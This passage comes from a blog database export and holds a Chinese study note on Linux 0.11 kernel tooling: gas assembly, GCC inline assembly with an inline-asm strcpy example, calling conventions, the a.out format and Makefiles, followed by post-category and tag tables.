as汇编</h1><ul>\n<li>内核中其余所有汇编语言程序(包括C语言产生的汇编程序)均由gas来编译,并与C语言程序编译产生的模块进行链接. </li>\n<li><strong>Intel格式的汇编与AT&amp;T格式的汇编区别:</strong><br><img src=\"/images/Linux_0.11_chapter3_Intel_AT&amp;T_diff.png\" alt=\"Linux_0.11_chapter3_Intel_AT&amp;T_diff.png\"></li>\n<li>as汇编器对汇编语言程序只进行简单地预处理,比如调整并删除多余空格和制表符,删除注释等;如需要进行宏替换则可以让汇编语言程序使用大写后缀’.S’来让as使用gcc的CPP预处理功能.</li>\n<li>具体关于汇编指令部分可以参考Intel开发者手册<h2 id=\"区和重定位\"><a href=\"#区和重定位\" class=\"headerlink\" title=\"区和重定位\"></a>区和重定位</h2><ul>\n<li>区:有时候也成为段,节或部分,英文为section,用来表示一个地址范围,操作系统将会以相同的方式对待和处理改地址范围的数据信息.</li>\n<li>重定位:当汇编过后的数据中出现重定位节时候,由链接器负责修正重定位的数据部分(至于为什么会需要重定位这与很多机制有关系了,必须虚拟内存等).<h2 id=\"链接器涉及的区\"><a href=\"#链接器涉及的区\" class=\"headerlink\" title=\"链接器涉及的区:\"></a>链接器涉及的区:</h2><img src=\"/images/Linux_0.11_chapter3_linker_section.png\" alt=\"Linux_0.11_chapter3_linker_section.png\"></li>\n</ul>\n</li>\n<li><p>关于gcc对于C程序的编译和链接过程可参考<a href=\"http://www.rutk1t0r.org/2016/09/06/C%E8%AF%AD%E8%A8%80%E5%AE%8F%E5%AE%9A%E4%B9%89%E5%B0%8F%E8%AF%95/\">前文</a></p>\n<h2 id=\"嵌入汇编\"><a href=\"#嵌入汇编\" class=\"headerlink\" title=\"嵌入汇编\"></a>嵌入汇编</h2><ul>\n<li><p>格式：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">asm(&quot;汇编语句&quot;</div><div class=\"line\">\t:输出寄存器</div><div class=\"line\">\t:输入寄存器</div><div class=\"line\">\t:会被修改的寄存器);</div></pre></td></tr></table></figure>\n</li>\n<li><p>嵌入汇编的好处就是利用gcc的灵活性在C语言里面精练地实现某些特定功能</p>\n</li>\n<li>Linux内核源码中仍然在使用圆括号的组合语句，一般用在宏定义。</li>\n<li>strcpy的嵌入汇编实现如下，因为首先要进行预处理，所以增加换行便于浏览。<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">//将字符串(src)拷贝到另一字符串(dest)，直到遇到NULL字符后终止</div><div class=\"line\">//参数:dest - 目的字符串指针, src - 源字符串指针, %0 - esi(src), %1 - edi(dest)。</div><div class=\"line\">extern inline char *strcpy(char *dest, const char *src)</div><div class=\"line\">&#123;</div><div class=\"line\">__asm__(\"cld\\n\"\t\t\t//清空方向标志，往上为默认增长</div><div class=\"line\">\t\t\"1:\\tlodsb\\n\\t\" //加载DS:[esi]处1字节-&gt;al,esi++</div><div class=\"line\">\t\t\"stosb\\n\\t\"\t\t//存储al-&gt;ES:[edi],edi++</div><div class=\"line\">\t\t\"testb %%al, %%al\\n\\t\"\t//测试刚刚存储是否为NULL字符</div><div class=\"line\">\t\t\"jne 1b\"\t\t//不是则继续跳到标号1处，否则就结束</div><div class=\"line\">\t\t::\"S\"(src), \"D\"(dest)\":\"si\",\"di\",\"ax\");</div><div class=\"line\">return dest;\t\t\t//返回目的字符串首地址，实现链式</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"C与汇编的相互调用\"><a href=\"#C与汇编的相互调用\" class=\"headerlink\" title=\"C与汇编的相互调用\"></a>C与汇编的相互调用</h2><ul>\n<li>调用约定(主要根据参数顺序、传参方式以及平衡堆栈者等来区分,当然其他体系结构也有其他实现,这里主要是IA-32体系,Intel 64调用约定已经开始大幅度使用寄存器传参)<ul>\n<li>fastcall:Linux系统调用比较常用，直接利用寄存器传参，子程序(被调用者)清除栈帧</li>\n<li>__cdecl:参数从右至左压栈，由调用者负责清除栈空间，可变参数</li>\n<li>stdcall:Windows的Win32 API常用，与__cdecl区别是被调用者一般用类似<code>ret n</code>指令来清除栈空间(清除栈空间主要是恢复被保存的寄存器值以及栈指针回归)</li>\n<li>PASCAL:从左到右压栈，被调用者清栈</li>\n<li>this:C++标准的Microsoft实现利用ecx传递对象首地址</li>\n</ul>\n</li>\n<li>在软件工程师的角度,以汇编语言作为”车轮子”和”底线”完全可以应付了绝大多数的问题了，因此只要源代码汇编过后保持一致性，各种语言之间的相互调用都是可以的。</li>\n</ul>\n<h1 id=\"Linux-0-11目标文件格式\"><a href=\"#Linux-0-11目标文件格式\" class=\"headerlink\" title=\"Linux 0.11目标文件格式\"></a>Linux 0.11目标文件格式</h1><blockquote>\n<p>有关目标文件和链接程序的基本工作原理可参见John R.Levine著的《Linkers &amp; Loaders》(有中文译版）一书。</p>\n</blockquote>\n<h2 id=\"a-out映像\"><a href=\"#a-out映像\" class=\"headerlink\" title=\"a.out映像\"></a>a.out映像</h2><ul>\n<li>在Linux 0.11系统中，GNU gcc或者gas编译输出的目标模块文件和链接程序所生成的可执行文件都使用了UNIX传统的a.out格式。对于具有内存分页机制的系统(可由硬件芯片给予软件以支持）来说，这是一种简单有效的目标文件格式。<br><img src=\"/images/Linux_0.11_chapter3_a.out_map.png\" alt=\"Linux_0.11_chapter3_a.out_map.png\"><br><img src=\"/images/Linux_0.11_chapter3_a.out_map_header1.png\" alt=\"Linux_0.11_chapter3_a.out_map_header1.png\"><br><img src=\"/images/Linux_0.11_chapter3_a.out_map_header2.png\" alt=\"Linux_0.11_chapter3_a.out_map_header2.png\"></li>\n<li>Linux内核可执行文件加载器将可执行文件从磁盘加载到内存中的映像<br><img src=\"/images/Linux_0.11_chapter3_a.out_map_to_memory.png\" alt=\"Linux_0.11_chapter3_a.out_map_to_memory.png\"></li>\n<li>链接程序的操作<br><img src=\"/images/Linux_0.11_chapter3_a.out_linkers.png\" alt=\"Linux_0.11_chapter3_a.out_linkers.png\"></li>\n</ul>\n<h2 id=\"链接程序预定义变量\"><a href=\"#链接程序预定义变量\" class=\"headerlink\" title=\"链接程序预定义变量\"></a>链接程序预定义变量</h2><ul>\n<li><p>在链接过程中，链接器ld和ld86会使用自身的变量记录下执行程序中每个段的逻辑地址。因此可以在程序用通过几个外部变量来获取程序中段的位置。</p>\n<ul>\n<li>_etext(etext):它的地址是.text段结束后的第一个地址;</li>\n<li>_edata(edata):它的地址是.data初始化数据区后的第一个地址;</li>\n<li>_end(end):它的地址是未初始化数据区.bss后的第一个地址位置。</li>\n<li>带下划线前缀和不带是等价的，唯一的区别在ANSI、POSIX等标准中没有定义符号etext、edata和end。</li>\n<li>Linux 0.1x 内核在初始化块设备高速缓存区时(fs/buffer.c)， 就使用了变量_end来获取内核映像文件Image在内存中的末端后的位置，并从这个位置起开始设置高速缓冲区。</li>\n</ul>\n</li>\n<li><p>利用System.map文件可以找寻到<strong>目标文件及符号信息映射到内存的位置</strong>、<strong>公共符号设置</strong>、<strong>链接中包含的所有文件成员以及其引用的符号</strong>和<strong>内核运行错误信息及调试</strong>。</p>\n<ul>\n<li>目标文件符号列表文件中的符号类型<br><img src=\"/images/Linux_0.11_chapter3_a.out_symbol1.png\" alt=\"Linux_0.11_chapter3_a.out_symbol1.png\"><br><img src=\"/images/Linux_0.11_chapter3_a.out_symbol2.png\" alt=\"Linux_0.11_chapter3_a.out_symbol2.png\"></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Make-和-Makefile\"><a href=\"#Make-和-Makefile\" class=\"headerlink\" title=\"Make 和 Makefile\"></a>Make 和 Makefile</h1><ul>\n<li>make程序通过Makefile文件知道如何编译和链接程序</li>\n<li>make的执行过程为两个阶段。<ul>\n<li>读取<strong>所有的</strong>Makefile文件以及包含的Makefile文件等，记录所有的变量及值、隐式的或显式的规则，并构造出所有目标对象及其先决条件的一幅全景图;</li>\n<li>make就使用这些内部结构来确定哪个目标对象需要被重建，并且根据相应的规则来操作。</li>\n</ul>\n</li>\n<li>当make重新编译程序的时，每个修改过的C代码文件(根据文件时间戳)必须被重新编译。如果头文件被修改过了，那么为了保证正确，make也会重新编译每个包含此头文件的C代码文件(因此某些声明最好放在头文件中，加快编译速度)。</li>\n</ul>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><ul>\n<li>基本的开发环境需要搭建和理解</li>\n<li>汇编语言在Linux内核中的重要性</li>\n<li>目标文件格式基本格式需理解(PE更复杂)</li>\n<li>链接器的高级特效需理解</li>\n<li>Makefile高级用法需要会用</li>\n</ul>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"civhncctb0001g8uawirx0ye7","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhnccvx000cg8uaww44yz6l"},{"post_id":"civhnccv20007g8ua9j06phpx","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhnccvx000gg8uarz1gvpe2"},{"post_id":"civhnccvh000ag8ua61phdzm9","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhnccwd000ig8uarc89zre6"},{"post_id":"civhncctr0002g8uauul4xs51","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhnccws000ng8uatrvdmu0z"},{"post_id":"civhnccvx000dg8ua6u301mdh","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhnccws000pg8uali5n1qsp"},{"post_id":"civhnccum0005g8uazblrmmdc","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhnccws000rg8ua95qiipce"},{"post_id":"civhnccwd000jg8uaws34ajk7","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhnccws000ug8ua5d7iulb0"},{"post_id":"civhnccum0006g8uam6xu0qvl","category_id":"civhnccwd000kg8uazmr4ynnz","_id":"civhnccx8000wg8ua1bl40kdf"},{"post_id":"civhnccvx000hg8uabimqw0df","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhnccx8000zg8uae3ukohqs"},{"post_id":"civhnccvx000hg8uabimqw0df","category_id":"civhnccws000qg8uabl3j2tdz","_id":"civhnccx80012g8uaojaajcz5"},{"post_id":"civhncdfw001ng8ua3yrrrs98","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhncdh7001ug8uaxds8nyf0"},{"post_id":"civhncdgr001pg8ua4u63tkld","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhncdhm001zg8ua40llugq1"},{"post_id":"civhncdh7001sg8uamx290t60","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhncdi20024g8ualpjw5u9r"},{"post_id":"civhncdh7001sg8uamx290t60","category_id":"civhnccws000qg8uabl3j2tdz","_id":"civhncdi20026g8uabwuetvc0"},{"post_id":"civhncdhm0021g8ua89otcuq2","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhncdi20029g8ualbv6w6m5"},{"post_id":"civhncdhm001wg8uaivc0t9jz","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civhncdii002bg8ua2fm3yvqn"},{"post_id":"civhncdhm001wg8uaivc0t9jz","category_id":"civhncdi20023g8uazd2j8okt","_id":"civhncdii002cg8ua3pl649df"},{"post_id":"civm7od4800008wuaivloppwu","category_id":"civhnccu60003g8uagrk5d8mi","_id":"civm7od4s00028wuafme06udk"}],"PostTag":[{"post_id":"civhnccv20007g8ua9j06phpx","tag_id":"civhnccum0004g8ua9re0h51f","_id":"civhnccvh000bg8uanhlf7ala"},{"post_id":"civhnccvx000hg8uabimqw0df","tag_id":"civhnccum0004g8ua9re0h51f","_id":"civhnccwd000mg8uayk4d0xko"},{"post_id":"civhnccvx000hg8uabimqw0df","tag_id":"civhnccvh0009g8uac7b284es","_id":"civhnccws000og8uasl8b9arw"},{"post_id":"civhncctb0001g8uawirx0ye7","tag_id":"civhnccum0004g8ua9re0h51f","_id":"civhnccws000tg8uawrpr7cz9"},{"post_id":"civhncctb0001g8uawirx0ye7","tag_id":"civhnccvh0009g8uac7b284es","_id":"civhnccx8000vg8uaeys60yqb"},{"post_id":"civhncctb0001g8uawirx0ye7","tag_id":"civhnccvx000fg8uabquyelnh","_id":"civhnccx8000yg8uaj8ow59lq"},{"post_id":"civhncctb0001g8uawirx0ye7","tag_id":"civhnccwd000lg8uaepfosxfm","_id":"civhnccx80010g8ua5uqxc5g0"},{"post_id":"civhncctr0002g8uauul4xs51","tag_id":"civhnccum0004g8ua9re0h51f","_id":"civhnccx80015g8ua2bd3un1l"},{"post_id":"civhncctr0002g8uauul4xs51","tag_id":"civhnccvh0009g8uac7b284es","_id":"civhnccxn0016g8uajep1ojew"},{"post_id":"civhncctr0002g8uauul4xs51","tag_id":"civhnccvx000fg8uabquyelnh","_id":"civhnccxn0018g8uaabprlmch"},{"post_id":"civhncctr0002g8uauul4xs51","tag_id":"civhnccwd000lg8uaepfosxfm","_id":"civhnccxn0019g8uakdtubqez"},{"post_id":"civhnccum0005g8uazblrmmdc","tag_id":"civhnccx80014g8ua2ruyja6u","_id":"civhnccxn001bg8uamn75guil"},{"post_id":"civhnccum0006g8uam6xu0qvl","tag_id":"civhnccxn0017g8uarlf0gpli","_id":"civhnccxn001cg8uactcih2o3"},{"post_id":"civhnccvh000ag8ua61phdzm9","tag_id":"civhnccum0004g8ua9re0h51f","_id":"civhnccxn001eg8uahzlbgtab"},{"post_id":"civhnccvh000ag8ua61phdzm9","tag_id":"civhnccxn001ag8uakkdqhr8f","_id":"civhnccxn001fg8uarrtzv35z"},{"post_id":"civhnccvx000dg8ua6u301mdh","tag_id":"civhnccxn001dg8ua68hxog2z","_id":"civhnccy3001jg8ua392myka2"},{"post_id":"civhnccvx000dg8ua6u301mdh","tag_id":"civhnccxn001gg8ua9l6kloqc","_id":"civhnccy3001kg8uafb055qof"},{"post_id":"civhnccvx000dg8ua6u301mdh","tag_id":"civhnccy3001hg8uaxg0jdxuv","_id":"civhnccy3001lg8uakbltuwcr"},{"post_id":"civhnccwd000jg8uaws34ajk7","tag_id":"civhnccxn001ag8uakkdqhr8f","_id":"civhnccy3001mg8ua2mpky3r5"},{"post_id":"civhncdfw001ng8ua3yrrrs98","tag_id":"civhnccx80014g8ua2ruyja6u","_id":"civhncdh7001rg8uaoz0mp4d3"},{"post_id":"civhncdfw001ng8ua3yrrrs98","tag_id":"civhnccxn001ag8uakkdqhr8f","_id":"civhncdh7001vg8uav51auhjq"},{"post_id":"civhncdgr001pg8ua4u63tkld","tag_id":"civhnccx80014g8ua2ruyja6u","_id":"civhncdhm0020g8uacv387kg4"},{"post_id":"civhncdgr001pg8ua4u63tkld","tag_id":"civhnccxn001dg8ua68hxog2z","_id":"civhncdi20022g8ua9ld5xoxx"},{"post_id":"civhncdhm0021g8ua89otcuq2","tag_id":"civhnccx80014g8ua2ruyja6u","_id":"civhncdi20025g8ua01bdcex2"},{"post_id":"civhncdhm0021g8ua89otcuq2","tag_id":"civhnccxn001dg8ua68hxog2z","_id":"civhncdi20028g8uawqlei2lz"},{"post_id":"civhncdh7001sg8uamx290t60","tag_id":"civhnccum0004g8ua9re0h51f","_id":"civhncdii002eg8uarntfnfby"},{"post_id":"civhncdh7001sg8uamx290t60","tag_id":"civhncdhm001yg8ua8jk3uc41","_id":"civhncdii002fg8uaimqr0wjc"},{"post_id":"civhncdh7001sg8uamx290t60","tag_id":"civhncdi20027g8ua5apeli7m","_id":"civhncdii002gg8ua71199rkq"},{"post_id":"civhncdh7001sg8uamx290t60","tag_id":"civhncdi2002ag8uaaq5c6fvd","_id":"civhncdii002hg8uaic916cni"},{"post_id":"civhncdhm001wg8uaivc0t9jz","tag_id":"civhnccxn001dg8ua68hxog2z","_id":"civhncdii002ig8uajrqj5f1a"},{"post_id":"civhncdhm001wg8uaivc0t9jz","tag_id":"civhncdii002dg8ua96znzbyh","_id":"civhncdii002jg8ua1wpb5fjy"},{"post_id":"civm7od4800008wuaivloppwu","tag_id":"civhnccum0004g8ua9re0h51f","_id":"civm7od4o00018wua5q2gdeow"},{"post_id":"civm7od4800008wuaivloppwu","tag_id":"civhnccvh0009g8uac7b284es","_id":"civm7od4t00038wuausjvfi1y"},{"post_id":"civm7od4800008wuaivloppwu","tag_id":"civhnccvx000fg8uabquyelnh","_id":"civm7od4y00048wuatj2ozh9w"},{"post_id":"civm7od4800008wuaivloppwu","tag_id":"civhnccwd000lg8uaepfosxfm","_id":"civm7od4y00058wuakvnlupp0"}],"Tag":[{"name":"C/C++","_id":"civhnccum0004g8ua9re0h51f"},{"name":"Linux kernel","_id":"civhnccvh0009g8uac7b284es"},{"name":"Asm","_id":"civhnccvx000fg8uabquyelnh"},{"name":"LDD","_id":"civhnccwd000lg8uaepfosxfm"},{"name":"Configure","_id":"civhnccx80014g8ua2ruyja6u"},{"name":"misc","_id":"civhnccxn0017g8uarlf0gpli"},{"name":"Linux","_id":"civhnccxn001ag8uakkdqhr8f"},{"name":"network security","_id":"civhnccxn001dg8ua68hxog2z"},{"name":"shell","_id":"civhnccxn001gg8ua9l6kloqc"},{"name":"pipe","_id":"civhnccy3001hg8uaxg0jdxuv"},{"name":"emb","_id":"civhncdhm001yg8ua8jk3uc41"},{"name":"uav","_id":"civhncdi20027g8ua5apeli7m"},{"name":"pixhawk","_id":"civhncdi2002ag8uaaq5c6fvd"},{"name":"information security","_id":"civhncdii002dg8ua96znzbyh"}]}}